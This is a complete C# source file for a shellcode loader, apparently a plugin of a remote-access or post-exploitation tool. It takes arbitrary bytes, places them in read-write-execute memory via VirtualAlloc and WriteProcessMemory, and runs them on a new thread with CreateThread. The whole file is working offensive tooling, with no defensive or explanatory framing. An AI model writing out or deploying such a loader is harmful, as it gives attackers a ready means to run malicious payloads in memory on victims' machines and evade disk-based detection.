using System;
using System.Runtime.InteropServices;

namespace Plugin;

internal class Shellcode
{
	[Flags]
	public enum AllocationType
	{
		Commit = 0x1000,
		Reserve = 0x2000,
		Decommit = 0x4000,
		Release = 0x8000,
		Reset = 0x80000,
		Physical = 0x400000,
		TopDown = 0x100000,
		WriteWatch = 0x200000,
		LargePages = 0x20000000
	}

	[Flags]
	public enum MemoryProtection
	{
		Execute = 0x10,
		ExecuteRead = 0x20,
		ExecuteReadWrite = 0x40,
		ExecuteWriteCopy = 0x80,
		NoAccess = 1,
		ReadOnly = 2,
		ReadWrite = 4,
		WriteCopy = 8,
		GuardModifierflag = 0x100,
		NoCacheModifierflag = 0x200,
		WriteCombineModifierflag = 0x400
	}

	public static void Run(byte[] shellcode, bool fork)
	{
		if (shellcode.Length == 0)
		{
			throw new Exception("Shellcode is empty!");
		}
		IntPtr intPtr = VirtualAlloc(UIntPtr.Zero, shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
		if (intPtr == IntPtr.Zero || Marshal.GetLastWin32Error() != 0)
		{
			throw new Exception("Unable to allocate memory region.");
		}
		try
		{
			IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
			WriteProcessMemory(GetCurrentProcess(), intPtr, shellcode, shellcode.Length, out lpNumberOfBytesWritten);
			uint lpThreadId = 0u;
			UIntPtr uIntPtr = CreateThread(UIntPtr.Zero, 0u, intPtr, IntPtr.Zero, 0u, ref lpThreadId);
			if (uIntPtr == UIntPtr.Zero)
			{
				throw new Exception("Unable to create thread for shellcode.");
			}
			if (!fork)
			{
				WaitForSingleObject(uIntPtr, uint.MaxValue);
			}
		}
		finally
		{
			if (!fork)
			{
				VirtualFree(intPtr, shellcode.Length, AllocationType.Release);
			}
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr VirtualAlloc(UIntPtr lpAddress, int dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool VirtualFree(IntPtr lpAddress, int dwSize, AllocationType dwFreeType);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32")]
	private static extern UIntPtr CreateThread(UIntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);

	[DllImport("kernel32")]
	private static extern uint WaitForSingleObject(UIntPtr hHandle, uint dwMilliseconds);
}
